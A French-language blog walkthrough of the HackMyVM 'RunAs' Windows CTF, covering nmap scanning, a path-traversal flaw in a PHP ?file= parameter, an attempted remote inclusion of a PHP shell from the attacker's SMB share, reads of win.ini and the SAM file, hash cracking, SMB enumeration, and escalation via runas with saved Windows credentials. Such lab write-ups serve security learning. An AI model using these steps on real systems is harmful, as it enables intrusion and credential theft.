---
title: "Solution du CTF RunAs de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### La marmotte et le papier d'alu

RunAs est un CTF Windows disponible sur HackMyVM.eu.

L'obtention de l'accès initial n'a aucune forme de réalisme. Passé ça, c'est plutôt simple.

```console
$ sudo nmap -T5 -sCV --script vuln -p- 192.168.56.118
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.118
Host is up (0.00031s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.57 ((Win64) PHP/7.2.0)
|_http-trace: TRACE is enabled
| vulners: 
|   cpe:/a:apache:http_server:2.4.57: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
--- snip ---
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|_      CVE-2024-36387  5.4     https://vulners.com/cve/CVE-2024-36387
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.57 (Win64) PHP/7.2.0
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|_  /: Root directory w/ directory listing
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 08:00:27:17:46:E4 (Oracle VirtualBox virtual NIC)
Service Info: Host: RUNAS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

On a donc une machine Windows 7 avec du SMB, du RDP (3389) ainsi qu'un serveur Apache 2.4.

La page d'index nous invite à remplir un paramètre dans l'URL :

```console
	<h1>There is no going back!</h1>
	<h2>?file=</h2>
```

Peut-être une faille d'inclusion ? Je mets en place un serveur SMB et j'y place un shell PHP :

```bash
docker  run -it -d --name samba -p 139:139 -p 445:445 -v /tmp/share:/share dperson/samba -s "myshare;/share;yes;no;yes"
```

Je provoque ensuite le chargement :

```
http://192.168.56.118/index.php?file=\\192.168.56.1\myshare\shell.php&cmd=dir
```

Mais c'est la déception : Je vois mon code PHP au lieu qu'il soit interprété.

Si le path donné contient un octet nul, on peut provoquer un message d'erreur (par exemple avec `http://192.168.56.118/index.php?file=/proc/self/fd/0%00`) :

```html
<b>Warning</b>:  file_exists() expects parameter 1 to be a valid path, string given in <b>C:\Apache24\htdocs\index.php</b> on line <b>20</b><br />
File not found!        </div>
```

Continuons de provoquer une erreur avec un problème de permissions (lecture de `c:\windows\System32\config\sam`) :

```html
<b>Warning</b>:  file_get_contents(c:\windows\System32\config\sam): failed to open stream: Resource temporarily unavailable in <b>C:\Apache24\htdocs\index.php</b> on line <b>21</b><br />
```

Cela confirme qu'il n'y a pas d'inclusion.

Que faire alors ? J'ai chargé `C:\Apache24\logs\access.log`  et on voit quelques fichiers qui ont été demandés depuis la machine elle-même.

```html
            <pre>::1 - - [06/Oct/2024:23:10:19 +0300] &quot;GET / HTTP/1.1&quot; 200 46<br />
::1 - - [06/Oct/2024:23:14:57 +0300] &quot;GET / HTTP/1.1&quot; 200 251<br />
::1 - - [06/Oct/2024:23:15:02 +0300] &quot;GET /index.php HTTP/1.1&quot; 200 1183<br />
::1 - - [06/Oct/2024:23:15:02 +0300] &quot;GET /styles.css HTTP/1.1&quot; 200 834<br />
--- snip ---
::1 - - [07/Oct/2024:00:04:23 +0300] &quot;GET /index.php?file=C:/Windows/win.ini HTTP/1.1&quot; 200 972<br />
::1 - - [07/Oct/2024:00:09:52 +0300] &quot;GET /index.php?file=C:/Windows/win.ini HTTP/1.1&quot; 200 1024<br />
::1 - - [07/Oct/2024:00:09:52 +0300] &quot;GET /styles.css HTTP/1.1&quot; 304 -<br />
```

Sans doute plus par désarroi que par intuition, j'ai chargé à mon tour le fichier `win.ini` et la première ligne était étrange :

```
; MD5-runas-b3a805b2594befb6c846d718d1224557
```

J'ai passé le hash sur `crackstation.net` qui m'a répondu `yakuzza`.

### Steak haché

Allons au délà que cet épisode de fumage de moquette. Il n'y a pas d'utilisateur `yakuzza` mais un utilisateur `runas`, second indice de la même ligne.

Ce dernier peut lister les partages, mais il n'y a pas d'accès en écriture :

```console
$ nxc smb 192.168.56.118 -u runas -p yakuzza --shares
SMB         192.168.56.118  445    RUNAS-PC         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:RUNAS-PC) (domain:runas-PC) (signing:False) (SMBv1:True) 
SMB         192.168.56.118  445    RUNAS-PC         [+] runas-PC\runas:yakuzza 
SMB         192.168.56.118  445    RUNAS-PC         [*] Enumerated shares
SMB         192.168.56.118  445    RUNAS-PC         Share           Permissions     Remark
SMB         192.168.56.118  445    RUNAS-PC         -----           -----------     ------
SMB         192.168.56.118  445    RUNAS-PC         ADMIN$                          Uzak Yönetici
SMB         192.168.56.118  445    RUNAS-PC         C$                              Varsayılan değer
SMB         192.168.56.118  445    RUNAS-PC         IPC$                            Uzak IPC
```

Toutefois, déjà à ce stade, on peut utiliser le directory traversal pour récupérer les flags, soit :

`C:\Users\runas\desktop\user.txt`  `HMV{User_Flag_Was_A_Bit_Bitter}`

`C:\Users\administrator\desktop\root.txt`  `HMV{Username_Is_My_Hint}`

L'accès qui nous reste désormais, c'est le RDP, et il fonctionne !

Vu le nom du CTF, on se doute que l'on va utiliser la commande `runas` avec des identifiants gardés dans le coffre de Windows, ce qui est expliqué chez [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault).

![RunAs cached credentials](/assets/img/hackmyvm/runas_hmv.png)

On aurait aussi pu s'en rendre compte à l'aide de winPEAS (version `.bat` utilisée ici) :

```console
[*] CREDENTIALS

 [+] WINDOWS VAULT
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault

Depolanan ge�erli kimlik bilgileri:

    Hedef: Domain:interactive=RUNAS-PC\Administrator
    T�r: Etki Alan� Parolas� 
    Kullan�c�: RUNAS-PC\Administrator
```

Ou tout simplement avec `cmdkey` :

```console
C:\Users\runas>cmdkey /list

Depolanan ge�erli kimlik bilgileri:

    Hedef: Domain:interactive=RUNAS-PC\Administrator
    T�r: Etki Alan� Parolas� 
    Kullan�c�: RUNAS-PC\Administrator
```

